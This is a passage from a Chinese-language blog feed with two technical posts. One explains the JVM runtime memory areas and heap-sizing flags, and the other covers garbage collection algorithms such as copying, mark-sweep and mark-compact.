    <content type="html"><![CDATA[<p>所有的Java开发人员可能会遇到这样的困惑？我该为堆内存设置多大空间呢？OutOfMemoryError的异常到底涉及到运行时数据的哪块区域？该怎么解决呢？其实如果你经常解决服务器性能问题，那么这些问题就会变的非常常见，了解JVM内存也是为了服务器出现性能问题的时候可以快速的了解那块的内存区域出现问题，以便于快速的解决生产故障。</p><p>先看一张图，这张图能很清晰的说明JVM内存结构布局。</p><p><strong><strong>Java的内存结构<em>**</em></strong></strong>：<em>**</em></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn2/Java-memory-model内存模型/331425-20160623115840235-1252768148-1608180051585.png" alt="JUtH_20121024_RuntimeDataAreas_6_MemoryModel"></p><p>JVM内存结构主要有三大块：<strong><strong>堆内存</strong></strong>、<strong><strong>方法区</strong></strong>和<strong><strong>栈</strong></strong>。堆内存是JVM中最大的一块由<strong><strong>年轻代</strong></strong>和<strong><strong>老年代</strong></strong>组成，而年轻代内存又被分成三部分，<strong><strong>Eden空间</strong></strong>、<strong><strong>From Survivor空间</strong></strong>、<strong><strong>To Survivor空间</strong></strong>,默认情况下年轻代按照8:1:1的比例来分配；</p><p>方法区存储类信息、常量、静态变量等数据，是线程共享的区域，为与Java堆区分，方法区还有一个别名Non-Heap(非堆)；栈又分为java虚拟机栈和本地方法栈主要用于方法的执行。</p><p>在通过一张图来了解如何通过参数来控制各区域的内存大小</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn2/Java-memory-model内存模型/331425-20160623115841781-223449019.png" alt="jvm_m_l"></p><p><strong><strong>控制参数</strong></strong><br>-Xms设置堆的最小空间大小。</p><p>-Xmx设置堆的最大空间大小。</p><p>-XX:NewSize设置新生代最小空间大小。</p><p>-XX:MaxNewSize设置新生代最大空间大小。</p><p>-XX:PermSize设置永久代最小空间大小。</p><p>-XX:MaxPermSize设置永久代最大空间大小。</p><p>-Xss设置每个线程的堆栈大小。</p><p>没有直接设置老年代的参数，但是可以设置堆空间大小和新生代空间大小两个参数来间接控制。</p><p> <strong><strong>老年代空间大小=堆空间大小-年轻代大空间大小</strong></strong></p><p>从更高的一个维度再次来看JVM和系统调用之间的关系</p><p><em>**</em><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn2/Java-memory-model内存模型/331425-20160623115846235-947282498.png" alt="002hLfJYgy71J9KxlH53b"></p><p>方法区和对是所有线程共享的内存区域；而java栈、本地方法栈和程序员计数器是运行是线程私有的内存区域。</p><p><strong><strong>下面我们详细介绍每个区域的作用</strong></strong></p><h4 id="Java堆（Heap）"><a href="#Java堆（Heap）" class="headerlink" title="Java堆（Heap）"></a>Java堆（Heap）</h4><p>  对于大多数应用来说，Java堆（Java Heap）是Java虚拟机所管理的内存中<strong><strong>最大</strong></strong>的一块。Java堆是被所有线程共享的一块内存区域，在虚拟机启动时创建。此内存区域的唯一目的就是存放对象实例，<strong>几乎所有的对象实例都在这里分配内存。</strong></p><p>   Java堆是垃圾收集器管理的主要区域，因此很多时候也被称做“<strong><em>GC堆</em></strong>”。如果从内存回收的角度看，由于现在收集器基本都是采用的分代收集算法，所以Java堆中还可以细分为：<strong><em>新生代和老年代；再细致一点的有Eden空间、From Survivor空间、To Survivor空间等。</em></strong></p><p>根据Java虚拟机规范的规定，Java堆可以处于物理上不连续的内存空间中，只要逻辑上是连续的即可，就像我们的磁盘空间一样。在实现时，既可以实现成固定大小的，也可以是可扩展的，不过当前主流的虚拟机都是按照可扩展来实现的（通过-Xmx和-Xms控制）。</p><p>如果在堆中没有内存完成实例分配，并且堆也无法再扩展时，将会抛出OutOfMemoryError异常。</p><h4 id="方法区（Method-Area）"><a href="#方法区（Method-Area）" class="headerlink" title="**方法区（Method Area）**"></a><strong><em>**</em></strong>方法区（Method Area）<strong><em>**</em></strong></h4><p> 方法区（Method Area）与Java堆一样，是各个线程共享的内存区域，<strong><strong>它用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据</strong></strong>。虽然Java虚拟机规范把方法区描述为堆的一个逻辑部分，但是它却有一个别名叫做Non-Heap（非堆），目的应该是与Java堆区分开来。</p><p>对于习惯在HotSpot虚拟机上开发和部署程序的开发者来说，很多人愿意把方法区称为“永久代”（Permanent Generation），本质上两者并不等价，仅仅是因为HotSpot虚拟机的设计团队选择把GC分代收集扩展至方法区，或者说使用永久代来实现方法区而已。</p><p>Java虚拟机规范对这个区域的限制非常宽松，除了和Java堆一样不需要连续的内存和可以选择固定大小或者可扩展外，还可以选择不实现垃圾收集。相对而言，垃圾收集行为在这个区域是比较少出现的，但并非数据进入了方法区就如永久代的名字一样“永久”存在了。这个区域的内存回收目标主要是针对常量池的回收和对类型的卸载，一般来说这个区域的回收“成绩”比较难以令人满意，尤其是类型的卸载，条件相当苛刻，但是这部分区域的回收确实是有必要的。</p><p>根据Java虚拟机规范的规定，当方法区无法满足内存分配需求时，将抛出OutOfMemoryError异常。 </p><h4 id="程序计数器（Program-Counter-Register）"><a href="#程序计数器（Program-Counter-Register）" class="headerlink" title="**程序计数器（Program Counter Register）**"></a><strong><em>**</em></strong>程序计数器（Program Counter Register）<strong><em>**</em></strong></h4><p>程序计数器（Program Counter Register）是一块较小的内存空间，它的作用可以看做是当前线程所执行的字节码的行号指示器。在虚拟机的概念模型里（仅是概念模型，各种虚拟机可能会通过一些更高效的方式去实现），字节码解释器工作时就是通过改变这个计数器的值来选取下一条需要执行的字节码指令，分支、循环、跳转、异常处理、线程恢复等基础功能都需要依赖这个计数器来完成。<br>由于Java虚拟机的多线程是通过线程轮流切换并分配处理器执行时间的方式来实现的，在任何一个确定的时刻，一个处理器（对于多核处理器来说是一个内核）只会执行一条线程中的指令。因此，为了线程切换后能恢复到正确的执行位置，每条线程都需要有一个独立的程序计数器，各条线程之间的计数器互不影响，独立存储，我们称这类内存区域为“线程私有”的内存。<br>   如果线程正在执行的是一个Java方法，这个计数器记录的是正在执行的虚拟机字节码指令的地址；如果正在执行的是Natvie方法，这个计数器值则为空（Undefined）。</p><p><strong><strong>此内存区域是唯一一个在Java虚拟机规范中没有规定任何OutOfMemoryError情况的区域。</strong></strong></p><h4 id="JVM栈（JVM-Stacks）"><a href="#JVM栈（JVM-Stacks）" class="headerlink" title="JVM栈（JVM Stacks）"></a><strong><em>JVM栈（JVM Stacks）</em></strong></h4><p>与程序计数器一样，Java虚拟机栈（Java Virtual Machine Stacks）也是线程私有的，<strong>它的生命周期与线程相同</strong>。<strong>虚拟机栈描述的是Java方法执行的内存模型</strong>：每个方法被执行的时候都会同时创建一个栈帧（Stack Frame）用于存储局部变量表、操作栈、动态链接、方法出口等信息。<strong>每一个方法被调用直至执行完成的过程，就对应着一个栈帧在虚拟机栈中从入栈到出栈的过程</strong>。 </p><p>局部变量表存放了编译期可知的各种基本数据类型（boolean、byte、char、short、int、float、long、double）、对象引用（reference类型，它不等同于对象本身，根据不同的虚拟机实现，它可能是一个指向对象起始地址的引用指针，也可能指向一个代表对象的句柄或者其他与此对象相关的位置）和returnAddress类型（指向了一条字节码指令的地址）。</p><p>其中64位长度的long和double类型的数据会占用2个局部变量空间（Slot），其余的数据类型只占用1个。局部变量表所需的内存空间在编译期间完成分配，当进入一个方法时，这个方法需要在帧中分配多大的局部变量空间是完全确定的，在方法运行期间不会改变局部变量表的大小。</p><p>在Java虚拟机规范中，对这个区域规定了两种异常状况：如果线程请求的栈深度大于虚拟机所允许的深度，将抛出<strong><strong>StackOverflowError</strong></strong>异常；如果虚拟机栈可以动态扩展（当前大部分的Java虚拟机都可动态扩展，只不过Java虚拟机规范中也允许固定长度的虚拟机栈），当扩展时无法申请到足够的内存时会抛出<strong><strong>OutOfMemoryError</strong></strong>异常。</p><h4 id="本地方法栈（Native-Method-Stacks）"><a href="#本地方法栈（Native-Method-Stacks）" class="headerlink" title="本地方法栈（Native Method Stacks）"></a><em>本地方法栈（Native Method Stacks）</em></h4><p>本地方法栈（Native Method Stacks）与虚拟机栈所发挥的作用是非常相似的，其区别不过是虚拟机栈为虚拟机执行Java方法（也就是字节码）服务，而<strong>本地方法栈则是为虚拟机使用到的Native方法服务</strong>。虚拟机规范中对本地方法栈中的方法使用的语言、使用方式与数据结构并没有强制规定，因此具体的虚拟机可以自由实现它。甚至有的虚拟机（譬如Sun HotSpot虚拟机）直接就把本地方法栈和虚拟机栈合二为一。与虚拟机栈一样，本地方法栈区域也会抛出StackOverflowError和OutOfMemoryError异常。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1）程序计数器<br>       几乎不占有内存。用于取下一条执行的指令。<br>2）堆<br>        所有通过new创建的对象的内存都在堆中分配，其大小可以通过-Xmx和-Xms来控制。堆被划分为新生代和旧生代，新生代又被进一步划分为Eden和Survivor区，最后Survivor由FromSpace和ToSpace组成，结构图如下所示：<br>新生代。新建的对象都是用新生代分配内存，Eden空间不足的时候，会把存活的对象转移到Survivor中，新生代<br>大小可以由-Xmn来控制，也可以用-XX:SurvivorRatio来控制Eden和Survivor的比例旧生代。用于存放新生代中经过多次垃圾回收仍然存活的对象。</p><p>3）栈<br>       每个线程执行每个方法的时候都会在栈中申请一个栈帧，每个栈帧包括局部变量区和操作数栈，用于存放此次方法调用过程中的临时变量、参数和中间结果。<br>4）本地方法栈<br>       用于支持native方法的执行，存储了每个native方法调用的状态<br>5）方法区<br>       存放了要加载的类信息、静态变量、final类型的常量、属性和方法信息。JVM用永久代（PermanetGeneration）来存放方法区，（在JDK的HotSpot虚拟机中，可以认为方法区就是永久代，但是在其他类型的虚拟机中，没有永久代的概念，有关信息可以看周志明的书）可通过-XX:PermSize和-XX:MaxPermSize来指定最小值和最大值。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;所有的Java开发人员可能会遇到这样的困惑？我该为堆内存设置多大空间呢？OutOfMemoryError的异常到底涉及到运行时数据的哪块区域？该怎么解决呢？其实如果你经常解决服务器性能问题，那么这些问题就会变的非常常见，了解JVM内存也是为了服务器出现性能问题的时候可以快速
      
    
    </summary>
    
    
    
      <category term="JVM" scheme="https://kayleh.top/tags/JVM/"/>
    
  </entry>
  
  <entry>
    <title>JVM垃圾回收机制</title>
    <link href="https://kayleh.top/jvm-gc/"/>
    <id>https://kayleh.top/jvm-gc/</id>
    <published>2020-12-16T17:46:57.000Z</published>
    <updated>2020-12-19T13:30:09.681Z</updated>
    
    <content type="html"><![CDATA[<h3 id="GC是什么"><a href="#GC是什么" class="headerlink" title="GC是什么"></a>GC是什么</h3><p><strong>分代收集算法</strong></p><blockquote><p>次数上频繁收集Young区 Minor GC</p><p>次数上较少收集Old区      Full GC</p><p>基本不动Perm永久区</p></blockquote><h3 id="GC是发生在哪个部分"><a href="#GC是发生在哪个部分" class="headerlink" title="GC是发生在哪个部分"></a>GC是发生在哪个部分</h3><blockquote><p>GC是发生在堆(heap)里面的</p></blockquote><h3 id="GC分几种"><a href="#GC分几种" class="headerlink" title="GC分几种?"></a>GC分几种?</h3><h4 id="one-引用计数法-被淘汰"><a href="#one-引用计数法-被淘汰" class="headerlink" title=":one:引用计数法(被淘汰)"></a>:one:引用计数法(被淘汰)</h4><p>缺点:</p><ul><li>每次对对象赋值时均要维护引用计数器,且计数器本身也有一定的消耗</li><li>较难处理循环引用</li></ul><blockquote><p>JVM的实现一般不采用这种方式</p></blockquote><h4 id="two-复制算法-Copying"><a href="#two-复制算法-Copying" class="headerlink" title=":two:复制算法(Copying)"></a>:two:复制算法(Copying)</h4><p>年轻代中使用的是Minor GC,这种GC算法采用的是复制算法(Copying)</p><p><strong>原理:</strong></p><ul><li>从根集合(GC Root)开始,通过Tracing从From中找到存活对象,拷贝到To中;</li><li>From丶To交换身份,下次内存分配从To开始</li></ul><p><strong>优势:heavy_check_mark:</strong> </p><ul><li><p>没有标记和清除的过程,效率高</p></li><li><p>没有内存碎片,可以利用bump-the-pointrt实现快速内存分配</p></li></ul><p><strong>劣势:heavy_multiplication_x:</strong></p><ul><li>需要双倍空间</li></ul><h4 id="three-标记清除-Mark-Sweep"><a href="#three-标记清除-Mark-Sweep" class="headerlink" title=":three:标记清除(Mark-Sweep)"></a>:three:标记清除(Mark-Sweep)</h4><p>老年代一般是由标记清除或者是标记清除与标记整理的混合实现</p><p><strong>原理</strong></p><ul><li><p>1.标记(Mark)</p><p>从根集合开始扫描,对存活的对象进行标记</p></li><li><p>2.清除(Sweep)</p><p>扫描整个内存空间,回收未被标记的对象,使用free-list记录可以区域.</p></li></ul><p><strong>优势:heavy_check_mark:</strong> </p><ul><li>不需要额外空间</li></ul><p><strong>劣势:heavy_multiplication_x:</strong></p><ul><li>两次扫描,耗时严重</li><li>会产生内存碎片</li></ul><h4 id="four-标记压缩-Mark-Compact"><a href="#four-标记压缩-Mark-Compact" class="headerlink" title=":four:标记压缩(Mark-Compact)"></a>:four:标记压缩(Mark-Compact)</h4><p><strong>原理:</strong></p><ul><li><p>1.标记(Mark)</p><p>与标记-清除一样</p></li><li><p>2.压缩(Compact)</p><p>再次扫描,并往一段滑动存活对象.</p></li></ul><p><strong>优势:heavy_check_mark:</strong> </p><ul><li>没有内存碎片,可以利用bump-the-pointrt</li></ul><p><strong>劣势:heavy_multiplication_x:</strong></p><ul><li>需要移动对象的成本</li></ul><h4 id="five-标记清除压缩-Mark-Sweep-Compact"><a href="#five-标记清除压缩-Mark-Sweep-Compact" class="headerlink" title=":five:标记清除压缩(Mark-Sweep-Compact)"></a>:five:标记清除压缩(Mark-Sweep-Compact)</h4><p><strong>原理:</strong></p><ul><li>1.Mark-Sweep和Mark-Compact的结合</li><li>2.和Mark-Sweep一致,当进行多次GC后才Compact</li></ul><p>:heavy_check_mark:减少移动对象的成本</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;GC是什么&quot;&gt;&lt;a href=&quot;#GC是什么&quot; class=&quot;headerlink&quot; title=&quot;GC是什么&quot;&gt;&lt;/a&gt;GC是什么&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;分代收集算法&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;次数上频繁收集Young区 
      
    
    </summary>
    
    
    
      <category term="JVM" scheme="https://kayleh.top/tags/JVM/"/>
    
  </entry>
  
</feed>
